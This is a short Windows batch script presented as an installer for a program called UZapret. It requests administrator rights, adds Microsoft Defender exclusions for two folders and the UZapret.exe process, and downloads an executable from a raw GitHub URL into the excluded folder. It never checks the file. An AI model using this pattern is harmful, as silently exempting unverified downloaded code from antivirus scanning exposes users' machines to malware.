@echo off
net session >nul 2>&1 || (echo Run as administrator! & pause & exit /b)

set "DOCS=%USERPROFILE%\Documents\UZapret"
set "DESKTOP=%USERPROFILE%\Desktop\UZapret"

mkdir "%DESKTOP%" 2>nul

powershell -Command "Add-MpPreference -ExclusionPath '%DOCS%'"
powershell -Command "Add-MpPreference -ExclusionPath '%DESKTOP%'"
powershell -Command "Add-MpPreference -ExclusionProcess 'UZapret.exe'"

echo Downloading...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sasha5685/UZapret/main/UZapret.exe' -OutFile '%DESKTOP%\UZapret.exe'"

echo Done! File in UZapretInstaller folder on desktop.
echo.
echo Note: The folder in Documents will be created automatically
echo when you first run the program.
pause